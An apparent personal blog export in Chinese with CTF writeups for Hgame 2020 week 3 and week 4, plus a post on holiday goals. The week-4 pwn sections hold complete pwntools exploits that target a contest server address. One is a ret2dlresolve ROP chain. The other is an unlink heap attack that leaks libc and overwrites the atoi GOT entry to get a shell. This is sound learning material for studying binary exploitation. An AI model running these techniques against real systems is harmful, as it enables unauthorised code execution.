free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

<span class="token comment">#dbg()</span>

irt<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>buuoj题目复现</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>chunck extend</tag>
        <tag>fastbin attack</tag>
      </tags>
  </entry>
  <entry>
    <title>2020寒假计划的完成度</title>
    <url>/d3ba1d69/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>曾年少轻狂，立下了无数flags。现在来写写进展情况。</p>
<span id="more"></span>

<h3 id="flags情况"><a href="#flags情况" class="headerlink" title="flags情况"></a>flags情况</h3><h4 id="吉他"><a href="#吉他" class="headerlink" title="吉他"></a>吉他</h4><p>寒假有一大半时间都花在吉他上了，但进展还是不怎么样</p>
<ol>
<li><strong>至少学习一首指弹曲，一首弹唱曲</strong> 练了一首指弹曲，除了小部分难点，其它都可以掌握好了；弹唱曲才刚刚开始练</li>
<li><strong>学习十个指弹技巧(基本能弹出来)</strong> 十个达不到，普通技巧基本都可以弹，但不熟练。被flag完败T_T</li>
<li><strong>学学基本乐理</strong> 学了也有一段时间了，还算满意</li>
</ol>
<h4 id="计算机技能"><a href="#计算机技能" class="headerlink" title="计算机技能"></a>计算机技能</h4><p>寒假剩下的大部分时间是在ctf比赛，所以这部分内容还算做的好</p>
<ol>
<li><strong>学习使用gdb,pwndbg</strong> 因为比赛，这两东西逐渐熟悉起来了</li>
<li><strong>重学c++</strong> 此flag已倒。</li>
<li><strong>完成keys的开发(自己做的一个密码管理的”软件”)</strong> 深思之后，打算换个框架重新开发。框架在学，所以这个进度为0,可以说flag又倒了</li>
</ol>
<h4 id="学业"><a href="#学业" class="headerlink" title="学业"></a>学业</h4><p>这个真没来得及顾上，高数教学视频一共70多集，也就看了10多集。败了败了</p>
<h4 id="运动"><a href="#运动" class="headerlink" title="运动"></a>运动</h4><p>前半个寒假倒是经常出去打羽毛球，但因疫情严重，后半个假期就没有出去过了。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>可以说，立下的flags倒下了一半，但至少有部分还是完成得不错的。<br>趁着在家学习，开学延期，多学东西，继续加油！</p>
]]></content>
      <categories>
        <category>计划清单</category>
      </categories>
  </entry>
  <entry>
    <title>Hgame-week4-writeup</title>
    <url>/6a7c8d32/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>（太难了这周，缩圈效果极佳）</p>
<span id="more"></span>

<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="easyVM"><a href="#easyVM" class="headerlink" title="easyVM"></a>easyVM</h3><p>简单处理下后，这题把你的输入经过一个虚拟机的操作变化后，与设定的结果比较，一致则成功，输入就是flag</p>
<p><img src="/images/6a7c8d32/re-1-2.png" alt="2"></p>
<p>虚拟机执行的指令如下：</p>
<p><img src="/images/6a7c8d32/re-1-1.png" alt="1"></p>
<p>分析handler函数，整理好操作的意图，大概有push压栈操作，pop出栈操作，还有一些运算，但是我还是看不太懂，最后动态调试，发现关键步骤在这里：</p>
<p><img src="/images/6a7c8d32/re-1-3.png" alt="3"></p>
<p>这个异或操作，再结合几条指令，发现就是改变输入的字符串的过程，而且就是把输入与一串固定不变的key进行异或而已，那么问题就简单了，全部输入<code>\0</code>，当然这个输入没法直接键盘输入，我直接在ida上改的，然后最后比较时的字符串就是我想要的key，再与dest异或就可以得出正确的flag了</p>
<p>dump出key和dest后，写了个脚本来计算，如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>

s1 <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'52334E474A4D676947706A362A51362A5E3654674E2340755E643361384B32485647764F63712459'</span><span class="token punctuation">)</span>
s2 <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'3A542F2A2F3613012E033540470E5F59016927083D4C331A2D0B400E4B2441272528292A02025D24'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span> c1<span class="token operator">^</span>c2 <span class="token keyword">for</span> c1<span class="token punctuation">,</span>c2 <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span>s2<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


flag <span class="token operator">=</span> xor<span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ROP-LEVEL5"><a href="#ROP-LEVEL5" class="headerlink" title="ROP_LEVEL5"></a>ROP_LEVEL5</h3><p>32位程序，没有输出流，没法leak，然后了解到一个不用leak的技术！——ret2dlresolve<br>比较难，涉及到一个延迟绑定的概念，这里就贴两篇文章参考：</p>
<p><a href="https://www.cnblogs.com/elvirangel/p/8994799.html">https://www.cnblogs.com/elvirangel/p/8994799.html</a><br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>
<p>我的exp如下，可以结合文章和我的注释看看：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ROP5'</span><span class="token punctuation">)</span>
<span class="token comment">#io = elf.process()</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20700</span><span class="token punctuation">)</span>

bss_buf_addr <span class="token operator">=</span> <span class="token number">0x804A060</span>
pop_3_ret <span class="token operator">=</span> <span class="token number">0x080485d9</span>
pop_ebp_ret <span class="token operator">=</span> <span class="token number">0x080485db</span>
leave_ret <span class="token operator">=</span> <span class="token number">0x804855A</span>
new_stack <span class="token operator">=</span> bss_buf_addr <span class="token operator">+</span> <span class="token number">0x800</span> <span class="token comment"># bss段前面大部分是不可写或者重要的数据</span>

<span class="token comment"># 构造好read，用于读入数据到new_stack</span>
offset <span class="token operator">=</span> <span class="token number">0x48</span> <span class="token comment"># padding_len</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> offset  <span class="token comment"># padding</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_3_ret<span class="token punctuation">)</span> <span class="token comment"># read后的返回地址，把下面三个参数给pop走,平衡栈</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># stdin</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>new_stack<span class="token punctuation">)</span> <span class="token comment"># 读入到new_stack中</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment"># 读入数据的长度</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebp_ret<span class="token punctuation">)</span> <span class="token comment"># pop new_stack到rbp</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>new_stack<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> <span class="token comment"># 栈迁移</span>

io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Are you the LEVEL5?\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>


bin_sh_str <span class="token operator">=</span> <span class="token string">'/bin/sh 1>&amp;0\x00'</span> <span class="token comment"># system的参数</span>
plt_0 <span class="token operator">=</span> <span class="token number">0x08048380</span> <span class="token comment"># plt表第0项，这是延迟绑定第一步的入口</span>


<span class="token comment"># 伪造的Elf32_Sym和Elf32_Rel </span>
dynsym_addr <span class="token operator">=</span> <span class="token number">0x80481d8</span>
dynstr_addr <span class="token operator">=</span> <span class="token number">0x8048278</span>
rel_plt <span class="token operator">=</span> <span class="token number">0x8048330</span>

fake_rel_addr <span class="token operator">=</span> new_stack<span class="token operator">+</span><span class="token number">0x14</span>  <span class="token comment"># 伪造的Elf32_Rel的地址</span>

<span class="token comment"># 伪造Elf32_Sym所处的地址</span>
fake_sym_addr <span class="token operator">=</span> fake_rel_addr<span class="token operator">+</span><span class="token number">0x8</span> <span class="token comment"># 0x14+0x8(fake_rel的大小)</span>
align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym_addr<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment"># sym结构体的位置要0x10对齐</span>
fake_sym_addr <span class="token operator">+=</span> align

<span class="token comment"># 伪造的Elf32_Sym在dynsym_addr指向的数组里的下标</span>
sym_index <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym_addr<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">0x10</span>

<span class="token comment"># Elf32_Rel的r_info字段</span>
r_info <span class="token operator">=</span> sym_index <span class="token operator">&lt;&lt;</span> <span class="token number">8</span> <span class="token operator">|</span> <span class="token number">0x7</span>

<span class="token comment"># 伪造的Elf32_Rel</span>
fake_rel <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>  <span class="token comment"># r_offset,r_info  找到的函数地址会填到r_offset处</span>

<span class="token comment"># 函数名字符串的地址</span>
fake_str_addr <span class="token operator">=</span> fake_sym_addr<span class="token operator">+</span><span class="token number">0x10</span>

<span class="token comment"># 字符串的偏移</span>
st_name <span class="token operator">=</span> fake_str_addr <span class="token operator">-</span> dynstr_addr 

<span class="token comment"># 伪造的Elf32_Sym</span>
fake_sym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span> <span class="token comment"># st_name,not important</span>

<span class="token comment"># 用于寻找Elf32_Rel结构体的偏移量</span>
rel_offset <span class="token operator">=</span> fake_rel_addr <span class="token operator">-</span> rel_plt <span class="token comment"># fake_rel_addr指向fake_rel</span>


<span class="token comment"># 构造ROP</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token comment"># 这个是给上面leave指令中的pop rbp这一步 </span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>rel_offset<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'aaaa'</span> <span class="token comment"># 返回地址</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>new_stack <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token comment"># binsh_str的地址</span>
payload <span class="token operator">+=</span> fake_rel   <span class="token comment"># 这里的地址是(new_stack+0x14)</span>
payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> align
payload <span class="token operator">+=</span> fake_sym
payload <span class="token operator">+=</span> <span class="token string">'system\x00'</span>  <span class="token comment"># 这里的地址是fake_sym_addr+0x10</span>
payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x50</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> bin_sh_str


<span class="token comment">#gdb.attach(io)</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Annevi-Note2"><a href="#Annevi-Note2" class="headerlink" title="Annevi_Note2"></a>Annevi_Note2</h3><p>其实这题和week3的Annevi_Note差不多，唯一的区别就是关闭了标准输出，没法leak。</p>
<p>查到资料了解到，bss段最开头有三个全局变量（有时候是两个）：stdin，stdout，stderr</p>
<p>这三个全局变量是IO_FILE结构体的指针，详细的就不说了（毕竟我还没学完），特别注意的是，printf函数使用的是stdout这个指针（puts函数呢不使用这个），因为关闭的是stdout，stderr没有被关闭，可以修改stdout这个指针的值为stderr的值，这样printf函数的输出就可以接收到了，而且程序中的show的处理就是用printf的。</p>
<p>stdout和stderr的值其实只有12bit之差，而且因为libc的基址最低12bit必定全为0（这大概是物理页对齐为0x1000的原因），所以stdin和stderr的最低12bit是完全固定的，就是偏移量的最低12bit。</p>
<p>由unlink造成任意地址写，可以修改stdout的值最低12bit为stderr的，但是写入按照字节为单位写入，所以还有4bit要爆破，概率还是蛮大的。</p>
<p>输出打开后，leak出libc基址，计算system函数的地址后，劫持atoi函数got项getshell</p>
<p>exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

stdout_addr <span class="token operator">=</span> <span class="token number">0x6020A0</span>
list_addr <span class="token operator">=</span> <span class="token number">0x6020E0</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./AN2'</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token comment">#io = process(['./AN2.bak'], env=&#123;'LD_PRELOAD': './libc6_2.23-0ubuntu10_amd64.so'&#125;)</span>
    <span class="token comment">#io = process(['./AN2.bak'])</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20701</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 0</span>
    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>

    <span class="token comment"># 伪造chunk</span>
    payload_1 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># prev_size</span>
    payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span> <span class="token comment"># size</span>
    payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>list_addr <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># fd</span>
    payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>list_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment"># bk</span>
    payload_1 <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x90</span> <span class="token operator">-</span> <span class="token number">0x20</span><span class="token punctuation">)</span>  <span class="token comment"># padding</span>
    payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>  <span class="token comment">#1的prev_size</span>
    payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span>  <span class="token comment">#1的size，并把前一个chunk标记为free(size最低位置为零)</span>
    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload_1<span class="token punctuation">)</span>

    dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 由于unlink，此时list[0] = list - 0x18，list[0]即#0</span>

    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>list_addr <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stdout_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将list[1]指向stdout处</span>

    pay <span class="token operator">=</span> <span class="token string">'\x40\x55'</span>
    edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span> <span class="token comment"># 爆破成stderr的值</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        ret <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'content'</span> <span class="token keyword">in</span> ret<span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">continue</span>

<span class="token comment"># 现在printf都有输出了</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>list_addr <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将list[1]指向atoi的got表项</span>
show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
atoi_addr <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
atoi_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span>

<span class="token keyword">print</span> <span class="token string">'atoi_addr='</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span>

libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'atoi'</span><span class="token punctuation">,</span> atoi_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> atoi_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'atoi'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>


<span class="token keyword">print</span> <span class="token string">'libc_base='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'system_addr='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># got表上atoi的地址修改成了system的地址</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh 1>&amp;2'</span><span class="token punctuation">)</span>  <span class="token comment"># 程序调用了atoi(input)</span>

<span class="token comment">#gdb.attach(io)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这周又学习了新的pwn技术，曾经无比渴望的二进制方向，现在我也可以算是踏出小小一脚入门了，路还长，继续加油！</p>
]]></content>
      <categories>
        <category>hgame-2020</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Hgame-week3-writeup</title>
    <url>/e1de0fb/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>week3的wp整理完毕！</p>
<span id="more"></span>


<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h3><p>右键查看源码，发现神奇的注释：</p>
<p><img src="/images/e1de0fb/web-1-2.png" alt="2"></p>
<p>此后下载下来就是一波源码审计：</p>
<p><strong>关键位置1</strong>：</p>
<p><img src="/images/e1de0fb/web-1-3.png" alt="3"></p>
<p>好！flag到手，快去提交!（</p>
<p>得到信息：<strong>只有第一才能得到flag</strong></p>
<p><strong>关键位置2</strong>：</p>
<p><img src="/images/e1de0fb/web-1-4.png" alt="4"></p>
<p>得到信息：<strong>看我加的注释！</strong></p>
<p>呃，我还是说一下，首先第一次sprintf，把$playerName变量的内容换到了welcomeMsg里的%s，而如果$playerName的是字符串<code>%s</code>，那么第二次sprintf就换成了encryptKey。</p>
<p><strong>关键位置3</strong>：</p>
<p><img src="/images/e1de0fb/web-1-5.png" alt="5"></p>
<p>得到信息：存在反序列化的代码，那么就有可能存在<strong>反序列化漏洞</strong>（具体可百度了解）</p>
<p>但是有验证，cookie后32个字节等于需要反序列化的数据拼接上$this-&gt;encryptKey之后的md5值（这貌似叫签名），这个$this-&gt;encryptKey是这么来的：</p>
<p><img src="/images/e1de0fb/web-1-6.png" alt="6"></p>
<p><img src="/images/e1de0fb/web-1-7.png" alt="7"></p>
